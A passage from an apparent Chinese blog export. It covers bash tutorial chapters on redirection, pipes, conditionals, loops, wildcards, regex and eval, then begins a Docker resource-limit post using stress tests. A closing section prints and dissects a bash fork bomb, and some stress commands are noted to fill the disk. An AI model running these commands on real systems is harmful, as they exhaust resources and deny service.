#改变stderr的输出通道； 两者都是将原来输出到monitor的数据，重定向输出到指定的文件了。 由于1是&gt;的预设值，因此，1&gt;与&gt;是相同的，都是改变stdout。 用上次的ls的例子说明一下好了:12$ ls my.file no.such.file 1&gt;file.outls: no.such.file: No such file or directory 这样monitor的输出就只剩下stderr的输出了，因为stdout重定向输出到文件file.out去了。 12$ ls my.file no.such.file 2&gt;file.errmy.file 这样monitor就只剩下了stdout, 因为stderr重定向输出到文件file.err了。 1$ ls my.file no.such.file 1&gt;file.out 2&gt;file.err 这样monitor就啥也没有了，因为stdout与stderr都重定向输出到文件了。 呵呵，看来要理解&gt;一点也不难啦是不？ 没骗你吧？ ^_^不过有些地方还是要注意一下的。 1$ ls my.file no.such.file 1&gt;file.both 2&gt;file.both 假如stdout(1)与stderr(2)都同时在写入file.both的话，则是采取覆盖的方式：后来写入覆盖前面的。 让我们假设一个stdout与stderr同时写入到file.out的情形好了； 首先stdout写入10个字符 然后stderr写入6个字符 那么，这时原本的stdout输出的10个字符，将被stderr输出的6个字符覆盖掉了。 那如何解决呢？所谓山不转路转，路不转人转嘛，我们可以换一个思维：将stderr导进stdout或者将stdout导进到stderr，而不是大家在抢同一份文件，不就行了。bingo就是这样啦： 2&gt;&amp;1 #将stderr并进stdout输出 1&gt;&amp;2 或者 &gt;&amp;2 #将stdout并进stderr输出。 于是，前面的错误操作可以改写为:12$ ls my.file no.such.file 1&gt;file.both 2&gt;&amp;1$ ls my.file no.such.file 2&gt;file.both &gt;&amp;2 这样，不就皆大欢喜了吗？ ^_^ 不过，光解决了同时写入的问题还不够，我们还有其他技巧需要了解的。故事还没有结束，别走开广告后，我们在回来…. 2.3 I/O重定向与linux中的 /dev/null ok，这次不讲I/O Redirection, 请佛吧。 学佛的最高境界，就是四大皆空。至于是空哪四大块，我也不知，因为我还没有到那个境界。这个空字,却非常值得反复把玩：色即是空，空即是色好了，施主要是能够领会空的禅意，那离修成正果不远了。 在linux的文件系统中，有个设备文件: /dev/null，许多人都问过我，那是什么玩意儿？我跟你说好了，那就是空啦。 没错空空如也的空就是null了，请问施主是否忽然有所顿悟了呢？然则恭喜了。 这个null在 I/O Redirection中可有用的很呢？ 将fd 1跟fd 2重定向到/dev/null去，就可忽略stdout, stderr的输出。 将fd 0重定向到/dev/null，那就是读进空(nothing). 比方说，我们在执行一个进程时，会同时输出到stdout与stderr，假如你不想看到stderr(也不想存到文件)， 那就可以：12$ ls my.file no.such.file 2&gt;/dev/nullmy.file 若要相反：只想看到stderr呢？还不简单将stdout，重定向的/dev/null就行：12$ ls my.file no.such.file &gt;/dev/nullls: no.such.file: No such file or directory 那接下来，假如单纯的只跑进程，而不想看到任何输出呢？哦，这里留了一手，上次没讲的法子,专门赠与有缘人… ^_^除了用 &gt;/dev/null 2&gt;&amp;1之外，你还可以如此：1$ ls my.file no.such.file &amp;&gt;/dev/null Tips: 将&amp;&gt;换成&gt;&amp;也行！ 2.4 重定向输出append (&gt;&gt;) ok？ 请完佛，接下来，再让我们看看如下情况：123456$ echo "1" &gt; file.out$ cat file.out1$ echo "2" &gt; file.out$ cat file.out2 看来，我们在重定向stdout或stderr进一个文件时，似乎永远只能获得最后一次的重定向的结果，那之前的内容呢？呵呵，要解决这个问题，很简单啦，将&gt;换成&gt;&gt; 就好了；1234$ echo "3" &gt;&gt; file.out$ cat file.out23 如此一来，被重定向的文件的之前的内容并不会丢失，而新的内容则一直追加在最后面去。so easy? 但是，只要你再次使用&gt;来重定向输出的话，那么，原来文件的内容被truncated(清洗掉)。这是，你要如何避免呢？备份， yes，我听到了，不过，还有更好的吗？既然与施主这么有缘分，老衲就送你一个锦囊妙法吧：123$ set -o noclobber$ echo "4" &gt; file.out-bash：file: cannot overwrite existing file. 那，要如何取消这个限制呢? 哦，将set -o换成 set +o就行了： 1234$ set +o noclobber$ echo "5" &gt; file.out$ cat file.out5 再问：那有办法不取消而又临时改写目标文件吗？ 哦，佛曰：不可告也。 啊，开玩笑的，开玩笑啦^_^， 哎，早就料到人心是不足的了 1234$ set -o noclobber$ echo "6" &gt;| file.out$ cat file.out6 留意到没有： 在&gt;后面加个|就好，注意： &gt;与|之间不能有空白哦。 2.5 I/O Redirection的优先级 呼….(深呼吸吐纳一下吧) ^_^ 再来还有一个难题要你去参透呢:1234567$ echo "some text here" &gt;file$ cat &lt; filesome text here$cat &lt; file &gt;file.bak$cat &lt; file.baksome text here$cat &lt; file &gt;file 嗯？注意到没有？怎么最后那个cat命令看到file是空的呢？why？ why？ why？ 前面提到：$cat &lt; file &gt; file之后，原本有内容的文件，结果却被清空了。要理解这个现象其实不难，这只是priority的问题而已： 在IO Redirection中, stdout与stderr的管道先准备好，才会从stdin读入数据。也就是说，在上例中，&gt;file会将file清空，然后才读入 &lt; file。但这时候文件的内容已被清空了，因此就变成了读不进任何数据。 哦，原来如此^_^那…如下两例又如何呢？12$ cat &lt;&gt; file$ cat &lt; file &gt;&gt;file 嗯…同学们，这两个答案就当练习题喽，下课前交作业。 Tips:我们了解到&gt;file能够快速把文件file清空；或者使用:&gt;file同样可以清空文件，:&gt;file与&gt;file的功能：若文件file存在，则将file清空; 否则，创建空文件file (等效于touch file);二者的差别在于&gt;file的方式不一定在所有的shell的都可用。 exec 5&lt;&gt;file; echo &quot;abcd&quot; &gt;&amp;5; cat &lt;&amp;5将file文件的输入、输出定向到文件描述符5，从而描述符5可以接管file的输入输出；因此，cat &lt;&gt;file等价于cat &lt; file。 而cat &lt; file &gt;&gt;file则使file内容成几何级数增长。 好了， I/O Redirection也快讲完了，sorry,因为我也只知道这么多而已啦嘻^_^不过，还有一样东东是一定要讲的，各位观众(请自行配乐~!#@$%):就是pipe line也。 2.6 管道(pipe line) 谈到pipe line，我相信不少人都不会陌生：我们在很多command line上常看到|符号就是pipe line了。 不过，pipe line究竟是什么东东呢？别急别急…先查一下英文字典，看看pipe是什么意思？没错他就是“水管”的意思…那么，你能想象一下水管是怎样一个根接一根的吗？又， 每根水管之间的input跟output又如何呢？灵光一闪：原来pipe line的I/O跟水管的I/O是一模一样的： 上一个命令的stdout接到下一个命令的stdin去了的确如此。不管在command line上使用了多少个pipe line，前后两个command的I/O是彼此连接的(恭喜：你终于开放了 ^_^ ) 不过…然而…但是… …stderr呢？好问题不过也容易理解：若水管漏水怎么办？也就是说：在pipe line之间, 前一个命令的stderr是不会接进下一个命令的stdin的，其输出，若不用2&gt;file的话，它还是送到monitor显示器上来。这点请你在pipe line运用上务必要注意的。 那，或许你有会问: 有办法将stderr也喂进下一个命令的stdin吗？(贪得无厌的家伙)，方法当然是有的，而且，你早已学习过了。提示一下就好：请问你如何将stderr合并进stdout一同输出呢？若你答不出来，下课后再来问我…(如果你脸皮足够厚的话…) 或许，你仍意犹未尽，或许，你曾经碰到过下面的问题：在cmd1 | cmd2 | cmd3 | ...这段pipe line中如何将cmd2的输出保存到一个文件呢？ 若你写成cmd1 | cmd2 &gt;file | cmd3的话，那你肯定会发现cmd3的stdin是空的，(当然了，你都将水管接到别的水池了)聪明的你或许会如此解决：1cmd1 | cmd2 &gt;file; cmd3 &lt; file 是的，你可以这样做，但最大的坏处是：file I/O会变双倍，在command执行的整个过程中，file I/O是最常见的最大效能杀手。凡是有经验的shell操作者，都会尽量避免或降低file I/O的频度。那上面问题还有更好的方法吗？有的，那就是tee命令了。所谓的tee命令是在不影响原本I/O的情况下，将stdout赋值到一个文件中去。因此，上面的命令行，可以如此执行：1cmd1 | cmd2 | tee file | cmd3 在预设上，tee会改写目标文件，若你要改为追加内容的话，那可用-a参数选项。基本上，pipe line的应用在shell操作上是非常广泛的。尤其是在text filtering方面，如，cat, more, head, tail, wc, expand, tr, grep, sed, awk…等等文字处理工具。搭配起pipe line 来使用，你会觉得 command line原来活得如此精彩的。常让人有“众里寻他千百度，蓦然回首，那人却在灯火阑珊处”之感。 好了，关于I/O Redirection的介绍就到此告一段落。若日后，有空的话，在为大家介绍其他在shell上好玩的东西。 shell十五问之12：你要if还是case呢？ 还记得我们在第10章所介绍的return value吗？ 是的，接下来的介绍的内容与之有关，若你的记忆也被假期所抵消的话，那建议您还是回去温习温习再回来。 若你记得return value，我想你也应该记得了&amp;&amp; 与 || 什么意思吧?用这两个符号再搭配 command group的话，我们可让shell script变得更加聪明哦。比方说：12345678cmd1 &amp;&amp; &#123; cmd2 cmd3 ;&#125; || &#123; cmd4 cmd5&#125; 意思是说：若 cmd1的return value为true的话，然后执行cmd2与cmd3，否则执行cmd4与cmd5。 事实上， 我们在写shell script的时候，经常需要用到这样、那样的条件以作出不同的处理动作。用&amp;&amp;与||的确可以达成条件执行的结果，然而，从“人类语言”上来理解，却不是那么直观。更多时候，我们还是喜欢用if...then...else...这样的的keyword来表达条件执行。 在bash shell中，我们可以如此修改上一段代码：12345678if cmd1then cmd2 cmd3 else cmd4 cmd5 fi 这也是我们在shell script中最常用的if判断式： 只要if后面的command line返回true的return value(我们常用test命令返回的return value)，然则就执行then后面的命令，否则，执行else之后的命令， fi则是用来结束判断式的keyword。 在if的判断式中，else部分可以不用，但then是必需的。(若then后不想跑任何command，可用:这个null command代替)。当然，then或else后面，也可以再使用更进一层的条件判断式，这在shell script的设计上很常见。若有多项条件需要”依序”进行判断的话，那我们则可使用elif这样的keyword：1234567if cmd1; then cmd2;elif cmd3; then cmd4 else cmd5 fi 意思是说： 若cmd1为true，然则执行cmd2； 否则在测试cmd3，若为true则执行cmd4； 倘若cmd1与cmd3均不成立，那就执行cmd5。 if判断式的例子很常见，你可从很多shell script中看得到，我这里不再举例子了。 接下来为要为大家介绍的是case判断式。虽然if判断式已可应付大部分的条件执行了，然而，在某些场合中，却不够灵活，尤其是在string式样的判断上，比方如下：123456789101112QQ() &#123; echo -n "Do you want to continue? (Yes/No): " read YN if [ "$YN" = Y -o "$YN" = y -o "$YN" = "Yes" -o "$YN" = "yes" -o "$YN" = YES] then QQ else exit 0 fi &#125;QQ 从例中，我们看得出来，最麻烦的部分是在判断YN的值可能有好几种样式。 聪明的你或许会如此修改：123456789101112 QQ() &#123; echo -n "Do you want to continue? (Yes/No): " read YN if echo "$YN" | grep -q '^[Yy]\([Ee][Ss]\)*$' then QQ else exit 0 fi &#125;QQ 也就是用Regular Expression来简化代码。(我们有机会，再来介绍RE)只是…是否有其他更方便的方法呢？有的，就是用case判断式即可：1234567891011121314 QQ() &#123; echo -n "Do you want to continue? (Yes/No): " read YN case "$YN" in [Yy]|[Yy][Ee][Ss]) QQ ;; *) exit 0 ;; esac &#125; QQ 我们常用的case的判断式来判断某一变量在不同的值(通常是string)时，作出不同的处理，比方说，判断script参数，以执行不同的命令。若你有兴趣，且用linux系统的话，不妨挖一挖/etc/init.d/*中的那堆script中的case用法。如下就是一例：123456789101112131415161718192021case "$1" in start) start ;; stop) stop ;; status) rhstatus ;; restart|reload) restart ;; condrestart) [ -f /var/lock/subsys/syslog ] &amp;&amp; restart || : ;; *) echo $"Usage: $0 &#123;start|stop|status|restart|condrestart&#125;" exit 1 esac (若你对 postional parameter的印象已经模糊了，请重看第9章吧。) shell十五问之13： for what？ while与until差在哪？ 现在要介绍的是shell script设计中常见的循环(loop)，所谓的loop就是script中的一段在一定条件下反复执行的代码。 bash shell中常用的loop有如下三种： for while until 1. for loop for loop 是从一个清单列表中读进变量的值，并依次的循环执行do到done之间的命令行。例：123456for var in one two three four five do echo ----------------- echo '$var is '$var echo done 上例的执行结果将会是： for会定义一个叫var的变量，其值依次是one two three four five。 因为有5个变量值，因此，do与done之间的命令行会被循环执行5次。 每次循环均用echo产生3个句子。而第二行中不在hard quote之内的$var会被替换。 当最后一个变量值处理完毕，循环结束。 我们不难看出，在for loop中，变量值的多寡，决定循环的次数。然而，变量在循环中是否使用则不一定，得视设计需求而定。倘若for loop没有使用in这个keyword来制变量清单的话，其值将从$@(或$*)中继承：123for var; do ...... done Tips: 若你忘记了`positional parameter, 请温习第9章… for loop用于处理清单(list)项目非常方便，其清单除了明确指定或从postional parameter取得之外，也可以从变量替换或者命令替换取得。(再一次提醒：别忘了命令行的“重组”特性)然而，对于一些“累计变化”的项目(整数的加减)，for也能处理：1234for ((i = 1; i &lt;= 10; i++)) do echo "num is $i" done 2. while loop 除了for loop, 上面的例子，我们也可改用while loop来做到：12345num=1while [ "$num" -le 10 ]; do echo "num is $num" num=$(($num + 1)) done while loop的原理与for loop稍有不同：它不是逐次处理清单中的变量值，而是取决于while 后面的命令行的return value： 若为true， 则执行do与done之间的命令，然后重新判断while后的return value。 若为false，则不再执行do与done之间的命令而结束循环。 分析上例： 在while之前，定义变量num=1。 然后测试(test)$num是否小于或等于10。 结果为true，于是执行echo并将num的值加1。 再作第二轮测试，此时num的值为1+1=2，依然小于或等于10，因此，为true，循环继续。 直到num为10+1=11时，测试才会失败…于是结束循环。 我们不难发现： 若while的测试结果永远为true的话，那循环将一直永久执行下去：123while:; do echo looping... done 上面的:是bash的null command，不做任何动作，除了返回true的return value。因此这个循环不会结束，称作死循环。死循环的产生有可能是故意设计的(如跑daemon)，也可能是设计的错误。若要结束死循环，可通过signal来终止(如按下ctrl-c)，(关于process与signal，等日后有机会再补充，十五问略过。) 3.until loop 一旦你能够理解while loop的话，那就能理解until loop:与while相反， until是在return value 为false时进入循环，否则，结束。因此，前面的例子，我们也可以轻松的用until来写：12345num=1until [ ! "$num" -le 10 ]; do echo "num is $num" num=$(($num + 1)) done 或者： 123456num=1until [ "$num" -gt 10 ]; do echo "num is $num" num=$(($num + 1)) done ok, 关于bash的三个常用的loop暂时介绍到这里。 4. shell loop中的break与continue 在结束本章之前，再跟大家补充两个loop有关的命令： break continue 这两个命令常用在复合式循环里，也就是do ... done之间又有更进一层的loop，当然，用在单一循环中也未尝不可啦… ^_^break用来中断循环，也就是强迫结束循环。若break后面指定一个数值n的话，则从里向外中断第n个循环，预设值为 break 1，也就是中断当前循环。在使用break时，需要注意的是，它与return及exit是不同的： break是结束loop； return是结束function； exit是结束script/shell; 而continue则与break相反：强迫进入下一次循环动作。若你理解不来的话，那你可简单的看成：在continue在done之间的句子略过而返回到循环的顶端。与break相同的是：continue后面也可以指定一个数值n，以决定继续哪一层(从里往外计算)的循环，预设值为 continue 1,也就是继续当前的循环。在shell script设计中，若能善用loop，将能大幅度提高script在复杂条件下的处理能力。请多加练习吧…^_^ shell十五问之14: [^ ] 跟[! ]差在哪？ (wildcard)通配符篇。 这个题目说穿了，就是要探讨Wildcard（通配符）与Regular Expression（正则表达式）的差别的。这也是很多初学shell的朋友很容易混淆的地方。首先，让我们回到十五问之第2问，再一次将我们提到的command line format 温习一次： 1command_name options arguments 同时，也再来理解一下，我在第5章所提到的变量替换的特性：1先替换，再重组 command line! 有了这个两个基础后，再让我们来看Wildcard是什么回事吧。 1.Wildcard （通配符） 首先Wildcard 也是属于 command line 的处理工序，作用于 arguments 里的 path 之上。没错，它不用在command_name，也不用在options上。而且，若argument不是path的话，那也与wildcard无关。换句更为精确的定义来讲，wildcard是一种命令行的路径扩展(path expansion)功能。提到这个扩展，那就不要忘了command line的重组特性了！是的，这与变量替换(variable subtitution)及命令替换(command substitution)的重组特性是一样的。也就是在wildcard进行扩展后，命令行会先完成重组，才会交给shell来处理。了解了wildcard的扩展与重组特性后，接下来，让我们了解一些常见的wildcard通配符吧。 wildcard 功能 * 匹配0个或多个字符 ? 匹配任意单一字符 [list] 匹配list中任意单一字符 [!list] 匹配不在list中任意单一字符 {string1,string2,…} 匹配string1或者stsring2或者(…)中其一字符串 Note: list 中可以指定单个字符，如abcd, 也可以指定ASCII字符的起止范围，如 a-d。 即[abcd] 与 [a-d] 是等价的，称为一个自定义的字符类。 例如：12345a*b # a 与 b 之间可以有任意个字符（0个或多个），如aabcb, axyzb, a012b,ab等。a?b # a 与 b 之间只能有一个字符，但该字符可以任意字符，如 aab, abb, acb, azb等。a[xyz]b # a 与 b 之间只能有一个字符，但这个字符只能是x或者y或者z，如：axb, ayb, azb这三个。a[!0-9]b# a 与 b 之间只能有一个字符，但这个字符不能是阿拉伯数字，如aab，ayb，a-b等。a&#123;abc,xyz,123&#125;b # a 与 b之间只能是abc或者xyz或者123这三个字串之一，扩展后是aabcb，axyzb，a123b。 [! ] 中的! 只有放在第一位时，才有取反的功效。举例: [!a]* 表示当前目录下不以a开头的路径名称； /tmp/[a\!]*表示/tmp目录下所有以a 或者 ! 开头的路径名称； 思考：为何!前面要加\呢？ [ - ]中-左右两边均有字符时，才表示一个范围，否则,仅作-(减号)字符来处理。举例： /tmp/*[-z]/[a-zA-Z]* 表示/tmp目录下所有以z或者-结尾的子目录中，以英文字母(不分大小写)开头的目录名称。 以*或?开头的wildcard不能匹配隐藏文件(即以.开头的文件名)。举例: *.txt并不能匹配.txt但能匹配1.txt这样的路径名。 但1*txt及1?txt均可匹配1.txt这样的路径名。 基本上，要掌握wildcard并不难，只要多加练习，再勤于思考，就能灵活运用了。 再次提醒： 别忘了wildcard的”扩展” + “重组” 这个重要特性，而且只作用在 argument的path上。 比方说，假如当前目录下有：a.txt b.txt c.txt 1.txt 2.txt 3.txt 这几个文件。当我们在命令行中执行ls -l [0-9].txt的命令行时，因为wildcard处于argument的位置上，于是根据匹配的路径，扩展为: 1.txt 2.txt 3.txt，在重组出ls -l 1.txt 2.txt 3.txt 这样的命令行。因此，你在命令行上敲 ls -l [0-9].txt 与 ls -l 1.txt 2.txt 3.txt 输出的结果是一样，原因就是在于此。 shell十五问之15: [^ ] 跟[! ]差在哪？ (RE: Regular Expression）正则表达式篇 2.Regular Expression (正则表达式) 接下来的Regular Expression(RE) 可是个大题目，要讲的很多。我这里当然不可能讲得很全。只希望能带给大家一个基本的入门概念，就很足够了。先来考一下英文好了：What is expression?简单来说，就是表达，也就是人们在沟通的时候所要陈述的内容。然而，生活中，表达方要清楚的将意思描述清楚，而让接收方完整无误地领会，可不是件容易的事情。因而才会出现那么多的误会, 真可叹句表达不易啊。同样的情形也发生在计算机的数据处理过程中，尤其是当我们在描述一段文字内容的时候。那么，我们不禁要问：有何方法可以让大家的误会降至最低程度，而让表达的精确度达到最高程度呢？答案就是标准化了，也就是我们这里要谈的Regular Expression啦…^_^然而，在进入RE介绍之前，不妨先让我们温习一下shell十五问之第4问，那就是关于quoting的部分。关键是要能够区分 shell command line上的meta与literal的这两种不同的字符类型。然后，我这里也跟你讲： RE 表达式里字符也分meta与literal这两种。 呵，不知亲爱的读者是否被我搞混乱了呢？… ^_^这也难怪啦，因为这的确是最容易混淆的地方，刚学RE的朋友很多时候，都死在这里！因此，请特别小心理解哦。简单而言，除非你将RE写在特定程序使用的脚本里，否则，我们的RE也是通过 command line输入的。然而，不少RE所使用的meta字符，跟shell 的meta字符是冲突的。比方说，*这个字符，在RE里是一个modifier(修饰符);而在command line上，确是wildcard(通配符)。那么，我们该如何解决这样的冲突呢？关键就是看你对shell十五问的第4问中所提的quoting是否足够理解了！若你明白shell quoting 就是用来在command line上关闭shell meta这一基本原理，那你就能很轻松的解决 RE meta与shell meta的冲突问题了： 用shell quoting 关闭掉shell meta就是了。就这么简单… ^_^再以刚提到*字符为例，若在command line的path中没有quoting处理的话，如abc* 就会被作为wildcard expression来扩充及重组了。若将其置于quoting中，即”abc*“，则可以避免wildcard expand的处理。 好了，说了大半天，还没有进入正式的RE介绍呢。大家别急，因为我的教学风格就是要先建立基础，循序渐进的… ^_^因此, 我这里还要再啰嗦一个观念，才会到RE的说明啦…(哈…别打我…) 当我们在谈到RE时，千万别跟wildcard搞混在一起！尤其是在command line的位置里，wildcard只作用于argument的path上；而RE却只用于字符串处理的程序中，这与路径名一点关系也没有。 Tips: RE 所处理的字符串，通常是指纯文本或通过stdin读进的内容。 ok，够了够了，我已看到一堆人开始出现不耐烦的样子了… ^^现在，就让我们登堂入室，揭开RE的神秘面纱吧，这样可以放过我了吧？ 哈哈…^^ 在RE的表达式里，主要分为两种字符：literal与meta。所谓literal就是在RE里不具有特殊功能的字符，如abc，123等；而meta,在RE里具有特殊的功能。要关闭之，需要在meta之前使用escape(\)转义字符。 然而，在介绍meta之前，先让我们来认识一下字符组合(character set)会更好些。一、所谓的char set就是将多个连续的字符作为一个集合。如 abc|xyz 表示abc或xyz这连个char set之一。其它含义如下： char set 意义 abc 表示abc三个连续的字符，但彼此独立而非集合。(可简单视为三个char set) (abc) 表示abc这三个连续字符的集合。(可简单视为一个char set) [abc] 表示单一字符，可为a或b或c;与wildcard的[abc]原理相同，称之为字符类。 [^abc] 表示单一字符，不为a或b或c即可。(与wildcard [!abc]原理相同) . 表示任意单个字符，(与wildcard的?原理相同) 在认识了RE的char set这个概念之后，然后，在让我们多认识几个RE中常见的meta字符： 二、 锚点(anchor): 用以标识RE在句子中的位置所在。常见的有： 锚点 说明 ^ 表示句首。如，^abc表示以abc开头的句子。 $ 表示句尾。如，abc$表示以abc结尾的句子。 \&lt; 表示词首。如，\&lt;abc表示以abc开头的词。 > 表示词尾。如，abc>表示以abc结尾的词。 三、 修饰符(modifier)：独立表示时本身不具意义，专门用以修饰前一个char set出现的次数。常见的有： modifier 说明 * 表示前一个char set出现0次或多次，即任意次。如ab*c表示a与c之间可以有0个或多个b。 ? 表示前一个char set出现0次或1次，即至多出现1次。如ab?c 表示a与c之间可以有0个或1个b。 + 表示前一个char set出现1次或多次，即至少出现1次。如ab+c 表示a与c之间可以有1个或多个b。 {n} 表示前一个char set出现n次。如ab{n}c 表示a与c之间可以有n个b。 {n, } 表示前一个char set至少出现n次。如ab{n}c 表示a与c之间至少有n个b。 {n, m} 表示前一个char set至少出现n次，至多出现m次。如ab{n，m}c 表示a与c之间至少有n个b，至多有m个b。 然而，当我们在识别modifier时，却很容易忽略”边界(boundary)字符”的重要性。 以ab{3,5}c为例，这里的a与c就是边界字符了。若没有边界字符的帮忙，我们很容易做出错误的解读。比方说: 我们用ab{3,5}这个RE（少了c这个边界字符)可以抓到”abbbbbbbbbb”(a后面有10个b)的字符串吗？从刚才的modifier的说明，我们一般认为，我们要的b是3到5个，若超出了此范围，就不是我们所要表达的。因此，我们或许会很轻率地认为这个RE抓不到结果（上述”abbbbbbbbbb”字符串）。 然而，答案却是可以的！为什么呢？让我们重新解读ab{3,5}这个RE看看：我们要表达的是a后接3到5个b即可，但3到5个b后面，我们却没有规定什么，因此，在RE后面可以是任意的字符串，当然包括b也可以啦！(明白了吗？) 同样，我们用b{3,5}c也同样可以抓到”abbbbbbbbbbc”这样的字符串。 但当我们用ab{3,5}c这样的RE时，由于同时有a与c这连个边界字符，就截然不同了！ 有空在思考一下，为何我们用下面这些RE都抓到abc这样的字符串呢？1234x*ax*, abx*, ax*babcx*, abx*c, ax*bcbx*c, bcx*, x*bc 但, 若我们在这些RE前后分别加^与$这样的anchor，那又如何呢？ 刚学RE时，只要能掌握上面这些基本的meta的大概就可以入门了。一如前述，RE是一种规范化的文字表达式，主要用于某些文字处理工具之间，如：grep， perl， vi，awk，sed，等等，常用于表示一段连续的字符串，查找和替换。 然而每种工具对RE表达式的具体解读或有一些细微差别，不过原理还是一致的。只要掌握RE的基本原理，那就一理通百理了，只是在实践时，稍加变通即可。 比方以grep来说，在Linux上，你可以找到grep，egrep，fgrep这些程序，其差异大致如下： grep： 传统的grep程序，在没有任何选项(options)的情况下，只输出符合RE字串的句子， 其常见的选项如下： 选项 (option) 用途 -v 反模式， 只输出“不含”RE的字符串的行。 -r 递归模式，可同时处理所有层级的子目录里的文件 -q 静默模式，不输出任何结果(stderr 除外，常用于获取return value，符合为true，否则，为false. -i 忽略大小写 -w 整词匹配，类似 \&lt;RE> -n 同时输出行号 -l 输出匹配RE的文件名 -o 只输出匹配RE的字符串。(gna新版独有，不见得所有版本支持) -E 切换为egrep egrep：为grep的扩充版本，改良了许多传统grep不能或者不便的操作， grep下不支持?与+这两种meta，但egrep支持； grep 不支持a|b或（abc|xyz）这类“或一”的匹配，但egrep支持； grep 在处理{n,m}时，需要\{ 与 \}处理，但egrep不需。 等诸如此类的。我个人建议能用egrep就不用grep啦…^_^ fgrep: 不作RE处理，表达式仅作一般的字符串处理，所有的meta均市区功能。 好了，关于RE的入门，我们暂时就介绍到这里。虽然有点乱，且有些观念也不恨精确，不过，姑且算是对大家的一个交差吧…^_^若这两天有时间的话，我在举些范例来分析一下，以帮助大家更好的理解。假如更有可能的话，也顺道为大家介绍一下sed这个工具。 3.eval 讲到command line的重组特性，真的需要我们好好的加以解释的。 如此便能抽丝剥茧的一层层的将整个command line分析的一清二楚，而不至于含糊。 假如这个重组的特性理解了，那我们介绍一个好玩的命令：eval。 我们在变量替换的过程中，常会碰到所谓的复式变量的问题：如：12$ a=1$ A1=abc 我们都知道echo $A1就可以得到abc的结果。然而，我们能否用$A$a来取代$A1，而同一样替换为abc呢？ 这个问题我们可用很轻松的用eval来解决：1$ eval echo \$A$a 说穿了，eval 只不过是在命令行完成替换重组后，在来一次替换重组罢了。就是这么简单啦^_^ 加餐：一个能让系统shell崩溃的shell 片段 一个能让系统shell崩溃的shell 片段： 12:() &#123; :|:&amp; &#125;; : # &lt;--- 这个别乱跑！好奇会死人的！echo '十人|日一|十十o' | sed 's/.../&amp;\n/g' # &lt;--- 跟你讲就不听，再跑这个就好了。 原来是一个bash的fork炸弹：ref：http://en.wikipedia.org/wiki/Fork_bomb 整理后的代码：12345:() &#123; :|:&amp;&#125;: 代码分析： 定义了一个 shell 函数，函数名是:，而这个函数体执行一个后台命令:|: 即冒号命令(或函数，下文会解释)的输出通过管道再传给冒号命令做输入。最后一行执行“:”命令在各种shell中运行结果分析：这个代码只有在 bash 中执行才会出现不断创建进程而耗尽系统资源的严重后果;在 ksh (Korn shell), sh (Bourne shell)中并不会出现，在 ksh88 和传统 unix Bourne shell 中冒号不能做函数名，即便是在 unix-center freebsd 系统中的 sh 和 pdksh（ksh93 手边没有，没试）中冒号可以做函数名，但还是不会出现那个效果。原因是 sh、ksh 中内置命令的优先级高于函数，所以执行“:”，总是执行内置命令“:”而不是刚才定义的那个恐怖函数。但是在 bash 中就不一样，bash 中函数的优先级高于内置命令，所以执行“:”结果会导致不断的递归，而其中有管道操作，这就需要创建两个子进程来实现，这样就会不断的创建进程而导致资源耗尽。 众所周知，bash是一款极其强大的shell，提供了强大的交互与编程功能。这样的一款shell中自然不会缺少“函数”这个元素来帮助程序进行模块化的高效开发与管理。于是产生了由于其特殊的特性，bash拥有了fork炸弹。fork炸弹的概念：进程递归式派生（fork，亦即自我复制），以使系统拒绝服务甚至崩溃。 Jaromil在2002年设计了最为精简的一个fork炸弹的实现。 所谓fork炸弹是一种恶意程序，它的内部是一个不断在fork进程的无限循环。 fork炸弹并不需要有特别的权限即可对系统造成破坏。 fork炸弹实质是一个简单的递归程序。 由于程序是递归的，如果没有任何限制，这会导致这个简单的程序迅速耗尽系统里面的所有资源。]]></content>
      <categories>
        <category>编程技能</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ops</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker容器资源限制测试]]></title>
    <url>%2Fdocker%2FDocker_Container_Limit%2F</url>
    <content type="text"><![CDATA[Docker容器资源限制测试Docker运行时的容器本质是进程。在Linux中，通过Namespace进行资源隔离，Cgroups进行资源限制。 一、Docker容器Cpu资源限制测试容器资源CPU限制设置测试默认所有的容器对于 CPU 的利用占比都是一样的，-c 或者 –cpu-shares 可以设置 CPU 利用率权重，默认为 1024，可以设置权重为 2 或者更高(单个 CPU 为 1024，两个为 2048，以此类推)。如果设置选项为 0，则系统会忽略该选项并且使用默认值 1024。通过以上设置，只会在 CPU 密集(繁忙)型运行进程时体现出来。当一个 container 空闲时，其它容器都是可以占用 CPU 的。cpu-shares 值为一个相对值，实际 CPU 利用率则取决于系统上运行容器的数量。 假如一个 1core 的主机运行 3 个 container，其中一个 cpu-shares 设置为 1024，而其它 cpu-shares 被设置成 512。当 3 个容器中的进程尝试使用 100% CPU 的时候「尝试使用 100% CPU 很重要，此时才可以体现设置值」，则设置 1024 的容器会占用 50% 的 CPU 时间。如果又添加一个 cpu-shares 为 1024 的 container，那么两个设置为 1024 的容器 CPU 利用占比为 33%，而另外两个则为 16.5%。简单的算法就是，所有设置的值相加，每个容器的占比就是 CPU 的利用率，如果只有一个容器，那么此时它无论设置 512 或者 1024，CPU 利用率都将是 100%。当然，如果主机是 3core，运行 3 个容器，两个 cpu-shares 设置为 512，一个设置为 1024，则此时每个 container 都能占用其中一个 CPU 为 100%。 1.1、通过参数–cpu-shares分配cpu使用权重现在运行两个测试 container，一个权重设置为 2，一个权重设置 4，启动命令如下： 1234[root@ok188 ~]# docker run -it -d --cpu-shares 2 --name 2_cpu centos:7 /bin/bashf3f125f7455974be77e58c0864d045b3b56ae2d007bd9095c47faca50893547c[root@ok188 ~]# docker run -it -d --cpu-shares 4 --name 4_cpu centos:7 /bin/bash5e623b55a22ef6d1e41e5978dd1c5d05d743b3a91498697db3b4b9c493f03f8b 通过压测工具如Stress进行压测，Stress使用实例: 产生13个cpu进程4个io进程1分钟后停止运行 1[root@ok188 ~]# stress -c 13 -i 4 --verbose --timeout 1m 测试硬盘，通过mkstemp()生成800K大小的文件写入硬盘，对CPU、内存的使用要求很低 1[root@ok188 ~]# stress -d 1 --hdd-noclean --hdd-bytes 800k 产生13个进程，每个进程都反复不停的计算由rand ()产生随机数的平方根 1[root@ok188 ~]# stress -c 13 向磁盘中写入固定大小的文件，这个文件通过调用mkstemp()产生并保存在当前目录下，默认是文件产生后就被执行unlink(清除)操作，但是可以使用–hdd-bytes选项将产生的文件全部保存在当前目录下，这会将你的磁盘空间逐步耗尽 1234# 生成小文件[root@ok188 ~]# stress -d 1 --hdd-noclean --hdd-bytes 13# 生成大文件[root@ok188 ~]# stress -d 1 --hdd-noclean 